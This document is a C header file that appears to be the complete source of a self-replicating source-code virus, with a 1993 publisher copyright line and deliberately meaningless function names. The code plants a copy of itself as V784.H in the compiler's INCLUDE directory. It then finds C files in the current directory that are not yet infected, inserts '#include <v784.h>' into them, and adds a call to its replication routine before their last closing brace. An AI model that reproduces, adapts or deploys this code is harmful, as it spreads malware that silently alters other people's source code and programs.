/* (C) Copyright 1993 American Eagle Publications, Inc. All rights reserved. */

#ifndef S784
#define S784
#include <stdio.h>
#include <dos.h>
static char a784[]={0};

int r785(char *a){FILE *b;int c;char d[255];if ((b=fopen(a,"r"))==NULL) return 0;
do{c=d[0]=0;while ((!feof(b))&&((c==0)||(d[c-1]!=10))){fread(&d[c],1,1,b); c++;}
d[--c]=0;if (strcmp("#include <v784.h>",d)==0){fclose(b);return 0;}}while (!feof(b));
close(b);return 1;}

int r783(char *a){struct find_t b;int c;c=_dos_findfirst(a,_A_NORMAL,&b);while
((c==0)&&(r785(b.name)==0))c=_dos_findnext(&b);if (c==0){strcpy(a,b.name);return 1;
}else return 0;}

void r784(char *a) {FILE *c,*b;char l[255],p[255];int i,j,k,f,g,h,d,e;g=h=d=e=f=0;
if ((c=fopen(a,"rw"))==NULL) return;if ((b=fopen("tq784","a"))==NULL) return;do
{j=l[0]=0;while ((!feof(c)) && ((j==0)||(l[j-1]!=10))){fread(&l[j],1,1,c); j++;}
l[j]=g=0;e++;for (i=0;l[i]!=0;i++){if ((l[i]=='/')&&(l[i+1]=='/')) g=1;if ((l[i]
=='/')&&(l[i+1]=='*')) h=1;if ((l[i]=='*')&&(l[i+1]=='/')) h=0;if ((l[i]=='}')&&
((g|h)==0))d=e;}if ((strncmp(l,"/*",2)!=0)&&(strncmp(l,"//",2)!=0)&&(f==0)){strcpy
(p,"#include <v784.h>\n");fwrite(&p[0],strlen(p),1,b);f=1;e++;}for (i=0;l[i]!=0;
i++)fwrite(&l[i],1,1,b);}while (!feof(c));fclose(c);fclose(b);if ((b=fopen("tq784",
"r"))==NULL) return;if ((c=fopen(a,"w"))==NULL) return;h=e=0;do{j=l[0]=0;while (
(!feof(b))&&((j==0)||(l[j-1]!=10))){fread(&l[j],1,1,b); j++;}l[j]=0;e++;for (i=0;
l[i]!=0;i++){if((l[i]=='/')&&(l[i+1]=='*')) h=1;if((l[i]=='*')&&(l[i+1]=='/')) h=0;}
if (e==d) {k=strlen(l);for(i=0;i<strlen(l);i++)if((l[i]=='/')&&(l[i+1]=='/'))k=i;
i=k;while((i>0)&&((l[i]!='}')||(h==1))){i--;if ((l[i]=='/')&&(l[i-1]=='*')) h=1;
if ((l[i]=='*')&&(l[i-1]=='/')) h=0;}if (l[i]=='}'){for(j=strlen(l);j>=i;j--)l[j+7]
=l[j];strncpy(&l[i],"s784();",7);}}for (i=0;l[i]!=0;i++) fwrite(&l[i],1,1,c);}
while (!feof(b));fclose(c);fclose(b);remove("tq784");}

int r781(char *a) {FILE *b;int c;strcpy(a,getenv("INCLUDE"));for (c=0;a[c]!=0;
c++) if (a[c]==';') a[c]=0;if (a[0]!=0) strcat(a,"\\V784.H"); else strcpy(a,
"V784.H");if ((b=fopen(a,"r"))==NULL) return 0;fclose(b);return 1;}

void r782(char *g) {int b,c,d,e;char a[255];FILE *q;if ((q=fopen(g,"a"))==NULL)
return; b=c=d=0; while (a784[b]) fwrite(&a784[b++],1,1,q); while (a784[d]||(d==b))
{itoa((int)a784[d],a,10);e=0;while (a[e]) fwrite(&a[e++],1,1,q);d++;c++;if (c>20)
{strcpy(a,",\n                      ");fwrite(&a[0],strlen(a),1,q);c=0;}else
{a[0]=',';fwrite(&a[0],1,1,q);}}strcpy(a,"0};");fwrite(&a[0],3,1,q);b++;while
(a784[b]) fwrite(&a784[b++],1,1,q);fclose(q);}

void s784() {char q[64]; strcpy(q,getenv("INCLUDE"));if (q[0]){if (!r781(q))
r782(q); strcpy(q,"*.c"); if (r783(q)) r784(q);}}
#endif

